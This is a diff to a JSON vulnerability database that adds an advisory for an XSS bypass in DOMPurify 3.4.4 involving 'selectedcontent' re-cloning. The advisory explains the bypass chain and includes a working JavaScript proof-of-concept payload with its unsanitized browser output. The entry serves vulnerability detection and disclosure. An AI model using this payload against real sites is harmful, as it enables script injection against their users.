@@ -5039,6 +5039,29 @@
           "https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp",
           "https://github.com/cure53/DOMPurify/releases/tag/3.4.0"
         ]
+      },
+      {
+        "ranges": [
+          {
+            "atOrAbove": "3.4.4",
+            "below": "3.4.5"
+          }
+        ],
+        "summary": "DOMPurify XSS via selectedcontent re-clone",
+        "details": "### Summary\nDOMPurify 3.4.4 allows `selectedcontent` by default, allowing a chain in which browsers \"re-clone\" an XSS payload after sanitization, effectively bypassing DOMPurify. \n\n### Details\nThe chain is as follows:\n1. The browser parses the input and creates a `<selectedcontent>` clone from the selected `<option>`\n2. DOMPurify walks and sanitizes that generated clone.\n3. DOMPurify reaches the original `<option>` and removes `selected=javascript:1`\n4. The browser refreshes the `<selectedcontent>` clone from the original `option`'s content.\n5. The refreshed clone is in a subtree DOMPurify already walked, which DOMPurify doesn't go back to sanitize\n6. The returned string contains unsanitized markup inside `<selectedcontent>`.\n\n### PoC\n```js\nconst dirty =\n  '<select><button><selectedcontent></selectedcontent></button>' +\n  '<option selected=javascript:1>' +\n  '<img src=x onerror=alert(1)>x' +\n  '</option></select>';\n\nconst clean = DOMPurify.sanitize(dirty);\nconsole.log(clean);\n\ndocument.body.innerHTML = clean;\n```\n\nObserved \"sanitized\" output in Chromium 148/WebKit 625:\n```html\n<select><button><selectedcontent><img src=\"x\" onerror=\"alert(1)\">x</selectedcontent></button><option><img src=\"x\">x</option></select>\n```\n\nAfter reinsertion, the browser updates the live DOM and strips the handler from the displayed clone, but the `onerror` has already fired:\n```html\n<select><button><selectedcontent><img src=\"x\">x</selectedcontent></button><option><img src=\"x\">x</option></select>\n```\n\nReproduced in Chromium and WebKit, but not Safari (not yet latest WebKit) or Firefox. Will likely change with [browser support](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/selectedcontent) for `selectedcontent`.\n\n### Impact\nThis is a default-configuration DOMPurify sanitizer bypass resulting in XSS.\n\nApplications are impacted if they sanitize attacker-controlled HTML with DOMPurify 3.4.4 using the string-input path and then insert the returned string into the page, for example with innerHTML.",
+        "identifiers": {
+          "githubID": "GHSA-87xg-pxx2-7hvx",
+          "CVE": [
+            "CVE-2026-47423"
+          ]
+        },
+        "severity": "high",
+        "cwe": [
+          "CWE-79"
+        ],
+        "info": [
+          "https://github.com/cure53/DOMPurify/security/advisories/GHSA-87xg-pxx2-7hvx"
+        ]
       }
     ],
     "extractors": {
